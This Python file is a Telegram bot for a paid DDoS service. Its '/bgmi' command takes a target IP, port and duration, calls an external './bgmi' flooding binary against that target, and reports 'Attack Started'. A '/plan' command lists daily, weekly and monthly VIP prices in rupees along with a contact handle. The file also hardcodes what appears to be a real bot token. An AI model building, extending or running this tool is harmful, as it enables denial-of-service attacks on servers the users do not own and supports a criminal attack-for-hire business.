import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('8729385483:AAG4cGOGrzJYrNseSXEPp5NBGpT8t0ZYt9I')

# Configuration
LOG_FILE = "bot_logs.txt"
bgmi_cooldown = {}

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to handle the reply for the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"🚀 {username}, Attack Started!\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    # Simple Cooldown Logic (5 minutes)
    if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
        response = "⏳ You are on cooldown. Please wait 5 minutes."
        bot.reply_to(message, response)
        return

    command = message.text.split()
    if len(command) == 4:
        try:
            target = command[1]
            port = command[2]
            time = int(command[3])

            if time > 300:
                bot.reply_to(message, "❌ Error: Maximum time is 300 seconds.")
                return

            bgmi_cooldown[user_id] = datetime.datetime.now()
            record_command_logs(user_id, '/bgmi', target, port, time)
            start_attack_reply(message, target, port, time)

            # Executing the binary safely without shell=True to prevent injection
            subprocess.run(["./bgmi", target, port, str(time), "300"])
            
            bot.reply_to(message, f"✅ Attack Finished on {target}")
        except ValueError:
            bot.reply_to(message, "❌ Invalid format. Port and Time must be numbers.")
    else:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"Your ID: {message.chat.id}")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
/bgmi : Launch attack.
/rules : Usage guidelines.
/plan : View pricing.
/id : Get your Telegram ID.'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}! Use /help to see commands.")

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    bot.reply_to(message, "Rules: Do not spam the bot. Max duration is 300s.")

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    response = '''💰 VIP Plans:
Day: 300 Rs
Week: 1000 Rs
Month: 2000 Rs
Contact: @ReporterAlpha'''
    bot.reply_to(message, response)

if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(none_stop=True)
